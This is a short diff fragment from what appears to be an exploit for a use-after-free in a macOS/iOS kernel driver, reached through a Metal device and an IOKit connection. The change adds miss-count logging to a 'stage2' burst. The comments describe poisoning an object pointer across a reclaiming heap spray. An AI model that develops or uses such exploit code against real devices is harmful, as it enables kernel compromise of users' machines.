@@ -407,7 +407,8 @@ static void uaf_stage2(id<MTLDevice> dev, io_connect_t conn, uint32_t stale_id,
         printf("[stage2] kr=%#010x × %u\n", seen[k], cnt[k]);
         nk_log("[uaf-stage2] burst kr=0x%x times=%u", seen[k], cnt[k]);
     }
-    nk_log("[uaf-stage2] burst done cls=%u", cls);
+    nk_log("[uaf-stage2] burst done cls=%u misses=%u", cls, misses);
+    printf("[stage2] burst done: classes=%u overflow-misses=%u\n", cls, misses);
 
     /* Burst B: poison the +0x10 object pointer across the reclaiming spray,
        one purgible call, log whatever comes back (kernel frame shows our
